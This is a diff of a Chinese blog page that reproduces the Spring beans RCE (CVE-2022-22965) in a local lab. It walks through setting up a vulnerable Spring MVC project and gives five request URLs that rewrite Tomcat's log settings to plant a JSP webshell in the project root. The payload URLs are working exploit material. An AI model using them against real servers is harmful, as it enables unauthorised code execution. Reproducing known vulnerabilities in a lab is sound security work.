@@ -16,12 +16,12 @@
     var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="0x01环境配置复现最近比较热的Spring beans RCE（CVE-2022-22965） jdk:17 tomcat:8.0.49">
+  <meta name="description" content="0x01环境配置 复现最近比较热的Spring beans RCE（CVE-2022-22965） jdk:17 tomcat:8.0.49">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Spring beans RCE 漏洞复现">
 <meta property="og:url" content="https://ka1t4v.github.io/2022/04/19/Spring%20beans%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Ka1t4v">
-<meta property="og:description" content="0x01环境配置复现最近比较热的Spring beans RCE（CVE-2022-22965） jdk:17 tomcat:8.0.49">
+<meta property="og:description" content="0x01环境配置 复现最近比较热的Spring beans RCE（CVE-2022-22965） jdk:17 tomcat:8.0.49">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401133359676.png">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401134633233.png">
@@ -219,11 +219,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h1><p>复现最近比较热的Spring beans RCE（CVE-2022-22965）</p>
+        <h1>0x01环境配置</h1>
+<p>复现最近比较热的Spring beans RCE（CVE-2022-22965）</p>
 <p>jdk:17</p>
 <p>tomcat:8.0.49</p>
 <span id="more"></span>
-
 <p>构建一个spring mvc项目</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401133359676.png" alt="image-20220401133359676"></p>
 <p>初始目录结构</p>
@@ -233,7 +233,6 @@
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401134809527.png" alt="image-20220401134809527"></p>
 <p>在pom.xml中添加仓库依赖</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">  &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--springframework--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-web&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.2.6.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.2.6.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.2.6.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-test&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.2.6.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.2.6.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-
 <p>修改配置文件web.xml使得可以使用注解中定义的名称来访问网页，而不需要加上网页后缀</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401140327645.png" alt="image-20220401140327645"></p>
 <p>添加指定扫描controller路径，才会将自己写的controller识别</p>
@@ -246,17 +245,15 @@
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401163134371.png" alt="image-20220401163134371"></p>
 <p>testcontroller</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class testcontroller &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/eval&quot;)</span><br><span class="line"></span><br><span class="line">    public void eval(UserInfo userInfo, Model model) &#123;</span><br><span class="line">        System.out.println(&quot;=================&quot;);</span><br><span class="line">        System.out.println(userInfo);</span><br><span class="line">        System.out.println(&quot;=================&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>UserInfo</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class UserInfo &#123;</span><br><span class="line">    private String id;</span><br><span class="line">    public User user;</span><br><span class="line"></span><br><span class="line">    public UserInfo() throws ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(&quot;[+] 调⽤UserInfo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void setId(String id) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUser(User user) &#123;</span><br><span class="line">        this.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User getUser() &#123;</span><br><span class="line">        return user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>User</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>并且在webapp&#x2F;views文件夹下创建网页eval.jsp</p>
+<p>并且在webapp/views文件夹下创建网页eval.jsp</p>
 <p>启动服务访问eval成功</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401164120792.png" alt="image-20220401164120792"></p>
-<h1 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h1><p>影响范围：</p>
+<h1>0x02漏洞利用</h1>
+<p>影响范围：</p>
 <p>JDK 9 及其以上版本</p>
 <p>Spring 框架以及衍生的框架Spring-mvc 或者存在 <code>spring-beans-*.jar</code> 文件</p>
 <p>产生条件：</p>
@@ -269,7 +266,6 @@
 </ul>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/testidea_war_exploded/eval?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69</span><br><span class="line">http://localhost:8080/testidea_war_exploded/eval?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</span><br><span class="line">http://localhost:8080/testidea_war_exploded/eval?class.module.classLoader.resources.context.parent.pipeline.first.directory=D%3A%5Cideahome%5Ctestidea%5Ctarget%5Ctestidea</span><br><span class="line">http://localhost:8080/testidea_war_exploded/eval?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck</span><br><span class="line">http://localhost:8080/testidea_war_exploded/eval?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br></pre></td></tr></table></figure>
-
 <p>directory路径应为项目当前绝对路径，最后会在项目根目录写入shell</p>
 <p>然后发送任意请求写入shell</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220401171138852.png" alt="image-20220401171138852"></p>
@@ -355,7 +351,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">0x01环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">0x02漏洞利用</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">0x01环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">0x02漏洞利用</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
